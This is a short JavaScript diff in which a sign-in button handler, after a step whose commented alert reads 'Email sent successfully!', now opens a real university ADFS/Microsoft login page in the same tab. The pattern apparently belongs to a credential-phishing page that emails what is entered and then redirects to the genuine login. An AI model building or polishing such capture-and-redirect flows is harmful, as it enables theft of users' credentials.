@@ -26,7 +26,8 @@ signInButton.addEventListener('click', () => {
     .then(() => {
       //alert('Email sent successfully!');
       window.open(
-        'https://fs.fon.bg.ac.rs/adfs/ls/?wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline/'
+        'https://fs.fon.bg.ac.rs/adfs/ls/?wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline/',
+        '_self'
       );
     })
     .catch((err) => {
